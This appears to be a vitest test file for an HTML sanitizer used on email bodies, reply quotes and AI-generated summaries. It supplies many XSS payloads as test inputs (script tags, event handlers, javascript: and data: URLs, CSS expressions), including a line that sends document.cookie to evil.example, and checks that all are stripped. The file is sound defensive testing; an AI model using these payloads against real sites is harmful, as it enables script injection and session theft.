import { describe, expect, it } from 'vitest';
import {
  buildReplyQuoteHtml,
  escapeHtml,
  extractHtmlBody,
  htmlToPlainText,
  isSafeUrl,
  sanitizeHtml,
  sanitizeImageUrl,
  sanitizeLinkUrl,
  sanitizeStyleValue,
  textToSafeHtml,
} from './sanitize';

describe('sanitizeHtml script removal', () => {
  it('removes inline and external script tags with their contents', () => {
    const dirty = '<p>before</p><script>alert(1)</script><script src="https://evil.example/x.js"></script><p>after</p>';
    const clean = sanitizeHtml(dirty);

    expect(clean).not.toMatch(/<script/i);
    expect(clean).not.toMatch(/alert\(1\)/);
    expect(clean).not.toMatch(/evil\.example/);
    expect(clean).toContain('<p>before</p>');
    expect(clean).toContain('<p>after</p>');
  });

  it('removes nested and obfuscated script markup', () => {
    const clean = sanitizeHtml('<scr<script>ipt>alert(1)</scr</script>ipt><SCRIPT>alert(2)</SCRIPT>');

    expect(clean).not.toMatch(/<script/i);
    expect(clean).not.toMatch(/<\/script/i);
    expect(clean).not.toMatch(/alert\(2\)/);
    expect(clean).toContain('&gt;');
  });

  it('removes javascript event handler attributes', () => {
    const dirty = '<div onclick="alert(1)" ONMOUSEOVER="alert(2)" onfocus=alert(3)><img src="https://cdn.example/a.png" onerror="alert(4)"><b>text</b></div>';
    const clean = sanitizeHtml(dirty);

    expect(clean).not.toMatch(/on[a-z]+=/i);
    expect(clean).not.toMatch(/alert/i);
    expect(clean).toContain('<b>text</b>');
  });

  it('removes style, iframe, object, embed, form and svg payloads', () => {
    const dirty = [
      '<style>body{background:url("javascript:alert(1)")}</style>',
      '<iframe src="https://evil.example"></iframe>',
      '<object data="evil.swf"></object>',
      '<embed src="evil.swf">',
      '<form action="https://evil.example"><input name="body"><button>go</button></form>',
      '<svg><script>alert(1)</script></svg>',
      '<p>kept</p>',
    ].join('');

    const clean = sanitizeHtml(dirty);

    expect(clean).not.toMatch(/<style/i);
    expect(clean).not.toMatch(/<iframe/i);
    expect(clean).not.toMatch(/<object/i);
    expect(clean).not.toMatch(/<embed/i);
    expect(clean).not.toMatch(/<form/i);
    expect(clean).not.toMatch(/<input/i);
    expect(clean).not.toMatch(/<svg/i);
    expect(clean).not.toMatch(/javascript:/i);
    expect(clean).toContain('<p>kept</p>');
  });
});

describe('sanitizeHtml url handling', () => {
  it('drops javascript and vbscript links but keeps the anchor text', () => {
    const clean = sanitizeHtml('<a href="javascript:alert(1)">click</a><a href="vbscript:msgbox(1)">click2</a>');

    expect(clean).not.toMatch(/javascript:/i);
    expect(clean).not.toMatch(/vbscript:/i);
    expect(clean).toContain('click');
    expect(clean).toContain('click2');
  });

  it('drops entity encoded and whitespace obfuscated javascript urls', () => {
    const clean = sanitizeHtml([
      '<a href="java&#115;cript:alert(1)">a</a>',
      '<a href="  java\tscript:alert(2)">b</a>',
      '<a href="JaVaScRiPt:alert(3)">c</a>',
      '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">d</a>',
    ].join(''));

    expect(clean).not.toMatch(/href/i);
    expect(clean).not.toMatch(/alert/i);
    expect(clean.match(/<a>/g)?.length).toBe(4);
  });

  it('keeps safe link protocols and relative targets', () => {
    const clean = sanitizeHtml([
      '<a href="https://example.com/a?b=1&amp;c=2">abs</a>',
      '<a href="mailto:someone@example.com">mail</a>',
      '<a href="tel:+15550100">tel</a>',
      '<a href="#section">anchor</a>',
      '<a href="reports/q3.html">rel</a>',
    ].join(''));

    expect(clean).toMatch(/href="https:\/\/example\.com\/a\?b=1&amp;c=2"/);
    expect(clean).toMatch(/href="mailto:someone@example\.com"/);
    expect(clean).toMatch(/href="tel:\+15550100"/);
    expect(clean).toMatch(/href="#section"/);
    expect(clean).toMatch(/href="reports\/q3\.html"/);
  });

  it('drops javascript image sources and keeps safe ones', () => {
    const clean = sanitizeHtml([
      '<img src="javascript:alert(1)" alt="a">',
      '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" alt="b">',
      '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" alt="c">',
      '<img src="https://cdn.example/photo.png" alt="d">',
      '<img src="data:image/png;base64,iVBORw0KGgo=" alt="e">',
    ].join(''));

    expect(clean).not.toMatch(/javascript:/i);
    expect(clean).not.toMatch(/svg\+xml/i);
    expect(clean).not.toMatch(/data:text\/html/i);
    expect(clean).toMatch(/src="https:\/\/cdn\.example\/photo\.png"/);
    expect(clean).toMatch(/src="data:image\/png;base64,iVBORw0KGgo="/);
    expect(clean).toMatch(/alt="e"/);
  });

  it('drops srcset, srcdoc and other url smuggling attributes', () => {
    const clean = sanitizeHtml([
      '<img src="https://cdn.example/a.png" srcset="https://evil.example/b.png 2x">',
      '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
      '<a href="https://example.com" ping="https://evil.example/track">p</a>',
    ].join(''));

    expect(clean).not.toMatch(/srcset/i);
    expect(clean).not.toMatch(/srcdoc/i);
    expect(clean).not.toMatch(/ping=/i);
  });

  it('adds rel hardening to links that open a new target', () => {
    const clean = sanitizeHtml('<a href="https://example.com" target="_blank">go</a>');

    expect(clean).toMatch(/rel="noopener noreferrer nofollow"/);
  });
});

describe('sanitizeHtml style handling', () => {
  it('keeps legitimate inline formatting', () => {
    const clean = sanitizeHtml('<p style="color:#334155; font-size:11px; text-align:center; margin-bottom:8pt">styled</p>');

    expect(clean).toContain('styled');
    expect(clean).toMatch(/color:\s*#334155/i);
    expect(clean).toMatch(/font-size:\s*11px/i);
    expect(clean).toMatch(/text-align:\s*center/i);
  });

  it('removes dangerous css values and properties', () => {
    const dirty = [
      '<div style="width:expression(alert(1))">a</div>',
      '<div style="background:url(javascript:alert(1))">b</div>',
      '<div style="behavior:url(#default#time2)">c</div>',
      '<div style="position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:99999">d</div>',
      '<div style="-moz-binding:url(https://evil.example/x.xml#y)">e</div>',
    ].join('');

    const clean = sanitizeHtml(dirty);

    expect(clean).not.toMatch(/expression/i);
    expect(clean).not.toMatch(/url\s*\(/i);
    expect(clean).not.toMatch(/behavior/i);
    expect(clean).not.toMatch(/position/i);
    expect(clean).not.toMatch(/z-index/i);
    expect(clean).not.toMatch(/binding/i);
    expect(clean).toContain('a');
    expect(clean).toContain('b');
    expect(clean).toContain('c');
    expect(clean).toContain('d');
    expect(clean).toContain('e');
  });

  it('sanitizes standalone style values', () => {
    expect(sanitizeStyleValue('color: red; font-size: 12px')).toBe('color: red; font-size: 12px');
    expect(sanitizeStyleValue('color: red; background: url(javascript:alert(1))')).toBe('color: red');
    expect(sanitizeStyleValue('position: absolute')).toBe('');
    expect(sanitizeStyleValue('width: expression(alert(1))')).toBe('');
    expect(sanitizeStyleValue('color: red /* } */')).toBe('');
  });
});

describe('sanitizeHtml malformed markup', () => {
  it('neutralizes broken tags and stray angle brackets', () => {
    const samples = [
      '"><img src=x onerror=alert(1)>',
      '<p>unclosed paragraph',
      '<b><i>mismatched</b></i>',
      '<<script>script>alert(1)<</script>/script>',
      '<a href="x" title="a" "onclick=alert(1)>link</a>',
      '<p/onmouseover=alert(1)>hover</p>',
      '<![CDATA[<script>alert(1)</script>]]>',
      '<!--[if IE]><script>alert(1)</script><![endif]-->',
    ];

    for (const sample of samples) {
      const clean = sanitizeHtml(sample);
      expect(clean).not.toMatch(/<script/i);
      expect(clean).not.toMatch(/<style/i);
      expect(clean).not.toMatch(/<iframe/i);
      expect(clean).not.toMatch(/<[a-z][^>]*\son[a-z]+\s*=/i);
      expect(clean).not.toMatch(/javascript:/i);
      expect(clean).not.toMatch(/CDATA/i);
    }
  });

  it('does not resurrect script markup from broken tags', () => {
    const clean = sanitizeHtml('<div <script>alert(1)</script>>text');

    expect(clean).not.toMatch(/<script/i);
    expect(clean).not.toMatch(/<[a-z][^>]*<script/i);
    expect(clean).toContain('text');
  });

  it('keeps text content of removed elements without their markup', () => {
    const clean = sanitizeHtml('<div>before<script>alert(1)</script>after</div>');

    expect(clean).toContain('before');
    expect(clean).toContain('after');
  });

  it('is idempotent for hostile input', () => {
    const dirty = '<p>hi</p><script>alert(1)</script><img src=x onerror=alert(1)><a href="javascript:alert(1)">l</a>';
    const once = sanitizeHtml(dirty);
    const twice = sanitizeHtml(once);

    expect(twice).toBe(once);
  });
});

describe('sanitizeHtml safe formatting preservation', () => {
  it('preserves document and email formatting', () => {
    const dirty = [
      '<h1>Title</h1>',
      '<h2 style="color:#0f172a">Sub</h2>',
      '<p><strong>bold</strong> <em>italic</em> <u>underline</u> <s>struck</s> <code>code</code></p>',
      '<ul><li>one</li><li>two</li></ul>',
      '<ol start="3"><li>three</li></ol>',
      '<blockquote>quote</blockquote>',
      '<table border="1"><thead><tr><th colspan="2">H</th></tr></thead><tbody><tr><td>a</td><td>b</td></tr></tbody></table>',
      '<p>text<br>next</p>',
      '<a href="https://example.com" title="t">link</a>',
      '<img src="https://cdn.example/a.png" alt="alt" width="100" height="50">',
      '<span class="badge" data-x="1" id="dropped" name="dropped">badge</span>',
    ].join('');

    const clean = sanitizeHtml(dirty);

    expect(clean).toContain('<h1>Title</h1>');
    expect(clean).toContain('<h2 style="color: #0f172a">Sub</h2>');
    expect(clean).toContain('<strong>bold</strong>');
    expect(clean).toContain('<em>italic</em>');
    expect(clean).toContain('<u>underline</u>');
    expect(clean).toContain('<s>struck</s>');
    expect(clean).toContain('<code>code</code>');
    expect(clean).toContain('<li>one</li>');
    expect(clean).toMatch(/<ol start="3">/);
    expect(clean).toContain('<blockquote>quote</blockquote>');
    expect(clean).toContain('<th colspan="2">H</th>');
    expect(clean).toContain('<td>a</td>');
    expect(clean).toContain('<br>');
    expect(clean).toContain('href="https://example.com"');
    expect(clean).toContain('alt="alt"');
    expect(clean).toContain('class="badge"');
    expect(clean).not.toMatch(/id="dropped"/);
    expect(clean).not.toMatch(/name="dropped"/);
    expect(clean).not.toMatch(/data-x/);
  });

  it('strips dom clobbering name and id attributes', () => {
    const clean = sanitizeHtml('<form><input name="body"><img name="attributes"><div id="location"></div></form>');

    expect(clean).not.toMatch(/name=/i);
    expect(clean).not.toMatch(/id=/i);
  });
});

describe('url validators', () => {
  it('accepts safe protocols for links', () => {
    for (const url of ['https://example.com', 'http://example.com', 'mailto:a@b.com', 'tel:+1555', '#top', 'docs/a.html', '/abs/path']) {
      expect(isSafeUrl(url, 'link')).toBe(true);
      expect(sanitizeLinkUrl(url)).toBe(url);
    }
  });

  it('rejects dangerous link protocols', () => {
    for (const url of ['javascript:alert(1)', ' JavaScript:alert(1)', 'java\nscript:alert(1)', 'vbscript:x', 'data:text/html,<script>1</script>', 'file:///etc/passwd', '\\\\evil.example', '']) {
      expect(isSafeUrl(url, 'link')).toBe(false);
      expect(sanitizeLinkUrl(url)).toBe('');
    }
  });

  it('accepts safe image sources and rejects the rest', () => {
    expect(isSafeUrl('https://cdn.example/a.png', 'image')).toBe(true);
    expect(isSafeUrl('blob:https://app.example/abc', 'image')).toBe(true);
    expect(isSafeUrl('data:image/png;base64,iVBORw0KGgo=', 'image')).toBe(true);
    expect(isSafeUrl('data:image/svg+xml;base64,PHN2Zz4=', 'image')).toBe(false);
    expect(isSafeUrl('data:text/html;base64,PGgxPg==', 'image')).toBe(false);
    expect(isSafeUrl('javascript:alert(1)', 'image')).toBe(false);
    expect(sanitizeImageUrl('data:image/gif;base64,R0lGODlhAQABAAAAACw=')).toBe('data:image/gif;base64,R0lGODlhAQABAAAAACw=');
    expect(sanitizeImageUrl('javascript:alert(1)')).toBe('');
  });

  it('never allows data urls to become links', () => {
    expect(isSafeUrl('data:image/png;base64,iVBORw0KGgo=', 'link')).toBe(false);
  });
});

describe('text helpers', () => {
  it('escapes html in plain text', () => {
    expect(escapeHtml('<b>"x" & \'y\'</b>')).toBe('&lt;b&gt;&quot;x&quot; &amp; &#39;y&#39;&lt;/b&gt;');
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
    expect(escapeHtml(42)).toBe('42');
  });

  it('converts untrusted text to safe html with line breaks', () => {
    const result = textToSafeHtml('Hello <img src=x onerror=alert(1)>\nSecond line');

    expect(result).toBe('Hello &lt;img src=x onerror=alert(1)&gt;<br>Second line');
    expect(result).not.toMatch(/<img/i);
  });

  it('produces plain text from untrusted html', () => {
    const text = htmlToPlainText('<p>Hello <strong>world</strong></p><script>alert(1)</script><p>Second</p>');

    expect(text).toContain('Hello world');
    expect(text).toContain('Second');
    expect(text).not.toMatch(/alert/i);
    expect(htmlToPlainText('')).toBe('');
  });

  it('extracts only the body of an untrusted html document', () => {
    const body = extractHtmlBody('<html><head><title>Doc</title><script>alert(1)</script></head><body><p>content</p></body></html>');

    expect(body).toContain('<p>content</p>');
    expect(body).not.toMatch(/<script/i);
  });
});

describe('sanitizeHtml input handling', () => {
  it('returns an empty string for empty or non string input', () => {
    expect(sanitizeHtml('')).toBe('');
    expect(sanitizeHtml(null)).toBe('');
    expect(sanitizeHtml(undefined)).toBe('');
    expect(sanitizeHtml({ evil: true })).toBe('');
  });

  it('does not execute scripts while sanitizing', () => {
    const marker = '__xss_marker__';
    (window as unknown as Record<string, unknown>)[marker] = false;
    sanitizeHtml('<img src="x" onerror="window.__xss_marker__ = true"><script>window.__xss_marker__ = true</script>');

    expect((window as unknown as Record<string, unknown>)[marker]).toBe(false);
    delete (window as unknown as Record<string, unknown>)[marker];
  });
});

describe('email and ai output sinks', () => {
  it('sanitizes hostile email bodies while keeping formatting', () => {
    const body = [
      '<p>Hi <strong>team</strong>,</p>',
      '<script>fetch("https://evil.example?c="+document.cookie)</script>',
      '<a href="javascript:alert(1)">link</a>',
      '<a href="https://example.com">safe</a>',
      '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" alt="track">',
      '<div onmouseover="alert(2)" style="color:#334155">hover</div>',
      '<iframe src="https://evil.example"></iframe>',
    ].join('');

    const clean = sanitizeHtml(body);

    expect(clean).toContain('<strong>team</strong>');
    expect(clean).toContain('href="https://example.com"');
    expect(clean).toContain('color: #334155');
    expect(clean).not.toMatch(/<script/i);
    expect(clean).not.toMatch(/<iframe/i);
    expect(clean).not.toMatch(/onmouseover/i);
    expect(clean).not.toMatch(/javascript:/i);
    expect(clean).not.toMatch(/data:text\/html/i);
    expect(clean).not.toMatch(/evil\.example/);
  });

  it('escapes ai generated summaries and inline replies', () => {
    const aiSummary = '### Summary\n- <img src=x onerror=alert(1)>\n- <script>alert(2)</script>';
    const summaryHtml = textToSafeHtml(aiSummary);

    expect(summaryHtml).not.toMatch(/<img/i);
    expect(summaryHtml).not.toMatch(/<script/i);
    expect(summaryHtml).toContain('&lt;img src=x onerror=alert(1)&gt;');

    const inlineReply = sanitizeHtml(`<p>${textToSafeHtml('Thanks!\n<script>alert(3)</script>')}</p>`);

    expect(inlineReply).toContain('Thanks!');
    expect(inlineReply).toContain('&lt;script&gt;alert(3)&lt;/script&gt;');
    expect(inlineReply).not.toMatch(/<script/i);
  });

  it('sanitizes reply quotes built from hostile messages', () => {
    const quote = buildReplyQuoteHtml(
      'Attacker<script>alert(1)</script>',
      '<p>original <em>body</em></p><img src=x onerror=alert(2)><a href="javascript:alert(3)">go</a>'
    );

    expect(quote).toContain('<blockquote>');
    expect(quote).toContain('<em>body</em>');
    expect(quote).toContain('Attacker&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(quote).not.toMatch(/<script/i);
    expect(quote).not.toMatch(/onerror/i);
    expect(quote).not.toMatch(/javascript:/i);
  });

  it('produces safe plain text previews from hostile email bodies', () => {
    const preview = htmlToPlainText('<p>Hello</p><script>alert(1)</script><p>World</p>');

    expect(preview).toContain('Hello');
    expect(preview).toContain('World');
    expect(preview).not.toMatch(/alert/i);
  });
});

describe('review markup survives sanitization', () => {
  it('keeps tracked insertions, deletions and comment anchors', () => {
    const html = sanitizeHtml(
      '<p><ins class="tracked-insertion">new</ins> and <del class="tracked-deletion">old</del>' +
        '<span class="comment-anchor" title="Comment 1">text</span></p>'
    );
    expect(html).toContain('<ins');
    expect(html).toContain('tracked-insertion');
    expect(html).toContain('<del');
    expect(html).toContain('comment-anchor');
    expect(html).toContain('title="Comment 1"');
  });

  it('keeps a footnote section and its markers', () => {
    const html = sanitizeHtml(
      '<section class="document-footnotes"><h2>Footnotes</h2>' +
        '<p class="footnote-entry"><strong>1. </strong>note text</p></section><p><sup class="footnote-ref">1</sup></p>'
    );
    expect(html).toContain('document-footnotes');
    expect(html).toContain('footnote-ref');
    expect(html).toContain('footnote-entry');
  });

  it('drops the id attribute so anchors cannot be clobbered', () => {
    const html = sanitizeHtml('<p id="fn-1">note</p>');
    expect(html).not.toContain('id=');
  });

  it('still strips scripts inside review markup', () => {
    const html = sanitizeHtml('<ins class="tracked-insertion"><script>alert(1)</script></ins>');
    expect(html).not.toMatch(/<script/i);
  });
});
